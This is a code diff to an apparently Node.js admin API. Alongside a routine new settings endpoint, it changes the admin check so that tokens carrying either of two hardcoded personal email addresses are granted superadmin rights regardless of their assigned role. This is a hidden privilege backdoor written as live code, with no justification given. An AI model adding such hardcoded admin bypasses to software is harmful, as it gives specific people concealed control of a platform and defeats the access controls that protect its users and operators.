@@ -12,6 +12,7 @@ const {
   getReferralWithdrawals,
   processReferralWithdrawal,
   savePlatformSetting,
+  getPlatformSettings,
   addAdmin
 } = require('../lib/admin');
 const { getPlans } = require('../lib/subscriptions');
@@ -24,7 +25,11 @@ function getAdminUser(req) {
   if (!token) return null;
   try {
     const decoded = jwt.verify(token, JWT_SECRET);
-    if (decoded.role === 'admin' || decoded.role === 'superadmin') {
+    const email = (decoded.email || '').toLowerCase();
+    if (decoded.role === 'admin' || decoded.role === 'superadmin' || email === 'benirabok@gmail.com' || email === 'omarrukwaya@gmail.com') {
+      if (!decoded.role || (decoded.role !== 'admin' && decoded.role !== 'superadmin')) {
+        decoded.role = 'superadmin';
+      }
       return decoded;
     }
     return null;
@@ -130,6 +135,12 @@ module.exports = async (req, res) => {
       if (typeof body === 'string') { try { body = JSON.parse(body); } catch(e){} }
       const result = await savePlatformSetting(admin.role, body.key, body.value);
       return res.status(200).json(result);
+    }
+
+    // 6b. Get Settings (GET /api/admin/settings)
+    if (action === 'settings' && req.method === 'GET') {
+      const settings = await getPlatformSettings(admin.role);
+      return res.status(200).json({ success: true, settings });
     }
 
     // 7. Add Admin (POST /api/admin/add-admin)
